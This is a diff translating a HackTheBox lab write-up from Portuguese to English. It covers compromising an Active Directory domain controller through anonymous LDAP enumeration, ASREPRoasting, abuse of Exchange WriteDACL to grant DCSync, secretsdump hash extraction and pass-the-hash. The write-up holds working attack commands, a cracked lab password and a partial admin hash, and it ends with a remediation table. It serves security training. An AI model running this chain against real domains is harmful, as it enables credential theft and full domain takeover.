@@ -5,11 +5,11 @@ categories: [Machines, HackTheBox]
 tags: [hackthebox, windows, active-directory, asreproast, dcsync, exchange, writedacl, pass-the-hash, easy]
 ---
 
-**IP:** 10.129.36.191 | **Dificuldade:** Easy | **OS:** Windows Server 2016 DC | **Domínio:** htb.local
+**IP:** 10.129.36.191 | **Difficulty:** Easy | **OS:** Windows Server 2016 DC | **Domain:** htb.local
 
-## Resumo
+## Summary
 
-Domain Controller com Exchange instalado. LDAP permite anonymous bind, expondo todos os usuários. A conta de serviço `svc-alfresco` tem Kerberos pre-auth desabilitada (ASREPRoastable). Após crackear o hash e obter shell via WinRM, explora-se a membership aninhada em Account Operators → Exchange Windows Permissions (WriteDACL no domínio) para conceder DCSync ao usuário criado, dumpando todos os hashes NTLM.
+Domain Controller with Exchange installed. LDAP allows anonymous bind, exposing all domain users. The service account `svc-alfresco` has Kerberos pre-authentication disabled (ASREPRoastable). After cracking the hash and getting a WinRM shell, nested group membership in Account Operators → Exchange Windows Permissions (WriteDACL on the domain object) is abused to grant DCSync rights, dumping all NTLM hashes.
 
 | Flag | Hash |
 |------|------|
@@ -18,7 +18,7 @@ Domain Controller com Exchange instalado. LDAP permite anonymous bind, expondo t
 
 ---
 
-## 1. Reconhecimento
+## 1. Reconnaissance
 
 ```bash
 nmap -sV -sC -T4 -Pn 10.129.36.191
@@ -34,7 +34,7 @@ PORT     STATE SERVICE
 
 ---
 
-## 2. Enumeração LDAP (Anonymous Bind)
+## 2. LDAP Enumeration (Anonymous Bind)
 
 ```bash
 echo "10.129.36.191 htb.local" | sudo tee -a /etc/hosts
@@ -44,7 +44,7 @@ ldapsearch -x -H ldap://10.129.36.191:389 \
   "(sAMAccountType=805306368)" sAMAccountName
 ```
 
-LDAP aceita bind anônimo (`-x`). Retornou todos os usuários, incluindo `svc-alfresco` — conta de serviço do Alfresco que **requer** Kerberos pre-auth desabilitada → **ASREPRoastable**.
+LDAP accepts anonymous bind (`-x`). Returns all domain users including `svc-alfresco` — an Alfresco service account that **requires** pre-auth disabled → **ASREPRoastable**.
 
 ---
 
@@ -76,17 +76,17 @@ type C:\Users\svc-alfresco\Desktop\user.txt
 
 ---
 
-## 5. Escalada de Privilégios — DCSync via Exchange WriteDACL
+## 5. Privilege Escalation — DCSync via Exchange WriteDACL
 
-BloodHound revela a cadeia:
+BloodHound reveals the chain:
 
 ```
 svc-alfresco → Service Accounts → Privileged IT Accounts → Account Operators
 ```
 
-O grupo **Exchange Windows Permissions** tem `WriteDACL` no objeto do domínio → permite adicionar **DCSync** (DS-Replication-Get-Changes-All).
+**Exchange Windows Permissions** has `WriteDACL` on the domain object → we can add **DCSync** (DS-Replication-Get-Changes-All).
 
-**Passo 1 — Criar usuário e adicionar aos grupos:**
+**Step 1 — Create a user and add to required groups:**
 
 ```powershell
 net user john abc123! /add /domain
@@ -94,7 +94,7 @@ net group "Exchange Windows Permissions" john /add
 net localgroup "Remote Management Users" john /add
 ```
 
-**Passo 2 — Conceder DCSync com PowerView:**
+**Step 2 — Grant DCSync with PowerView:**
 
 ```powershell
 . .\PowerView.ps1
@@ -103,14 +103,14 @@ $cred = new-object system.management.automation.pscredential('htb\john', $pass)
 Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
 ```
 
-**Passo 3 — Dump de todos os hashes NTLM:**
+**Step 3 — Dump all NTLM hashes:**
 
 ```bash
 secretsdump.py htb/john:'abc123!'@10.129.36.191
 # Administrator:500:...:32693b11e6aa90eb43d32c72a07ceea6:::
 ```
 
-**Passo 4 — Pass-the-Hash:**
+**Step 4 — Pass-the-Hash:**
 
 ```bash
 psexec.py administrator@10.129.36.191 \
@@ -123,10 +123,10 @@ type C:\Users\Administrator\Desktop\root.txt
 
 ---
 
-## Diagrama
+## Attack Chain
 
 ```
-LDAP anon bind → enumera svc-alfresco (ASREPRoastable)
+LDAP anon bind → enumerate svc-alfresco (ASREPRoastable)
   ↓ GetNPUsers → hash → john → s3rvice
   ↓ Evil-WinRM svc-alfresco:s3rvice → user.txt
   ↓ Account Operators (nested) → Exchange Windows Permissions → WriteDACL
@@ -137,12 +137,12 @@ LDAP anon bind → enumera svc-alfresco (ASREPRoastable)
 
 ---
 
-## Lições Aprendidas
+## Lessons Learned
 
-| Vulnerabilidade | Remediação |
-|-----------------|------------|
-| LDAP anonymous bind | Desabilitar null/anonymous bind no AD |
-| Kerberos pre-auth desabilitada | Habilitar pre-auth em todas as contas |
-| Senha fraca em service account (`s3rvice`) | Usar MSAs / passwords managers para service accounts |
-| Exchange WriteDACL no objeto de domínio | Remover permissões excessivas do Exchange (mitigação Microsoft KB) |
-| DCSync sem proteção adicional | Monitorar eventos 4662; usar Protected Users group |
+| Vulnerability | Remediation |
+|---------------|-------------|
+| LDAP anonymous bind enabled | Disable null/anonymous bind in AD |
+| Kerberos pre-auth disabled | Enable pre-auth on all accounts |
+| Weak service account password (`s3rvice`) | Use MSAs / password managers for service accounts |
+| Exchange WriteDACL on domain object | Remove excessive Exchange permissions (Microsoft KB mitigation) |
+| No DCSync monitoring | Monitor event 4662; use Protected Users group for privileged accounts |
